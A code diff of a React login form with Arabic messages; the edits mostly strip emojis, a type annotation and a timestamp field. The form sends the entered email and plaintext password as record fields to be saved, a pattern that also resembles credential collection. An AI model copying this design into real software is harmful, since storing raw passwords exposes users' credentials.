@@ -2,12 +2,14 @@ import React, { useState } from "react";
 import { toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
 
+toast.configure();
+
 const LoginForm = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     setIsLoading(true);
 
@@ -15,7 +17,6 @@ const LoginForm = () => {
       fields: {
         Email: email,
         Password: password,
-        Timestamp: new Date().toISOString(), // إضافة الوقت
       },
     };
 
@@ -36,13 +37,13 @@ const LoginForm = () => {
       console.log("Response:", result);
 
       if (response.ok) {
-        toast.success("✅ تم تسجيل الدخول بنجاح! تم حفظ بياناتك.");
+        toast.success("تم تسجيل الدخول بنجاح! تم حفظ بياناتك.");
       } else {
-        throw new Error(result.error?.message || "❌ فشل في تسجيل البيانات");
+        throw new Error(result.error?.message || "فشل في تسجيل البيانات");
       }
     } catch (error) {
       console.error("Error:", error);
-      toast.error("❌ تعذر حفظ البيانات، حاول مرة أخرى.");
+      toast.error("تعذر حفظ البيانات، حاول مرة أخرى.");
     } finally {
       setIsLoading(false);
     }
@@ -73,7 +74,7 @@ const LoginForm = () => {
           className="w-full bg-blue-500 text-white p-2 rounded"
           disabled={isLoading}
         >
-          {isLoading ? "🔄 جاري التسجيل..." : "🔑 تسجيل الدخول"}
+          {isLoading ? "جاري التسجيل..." : "تسجيل الدخول"}
         </button>
       </form>
     </div>
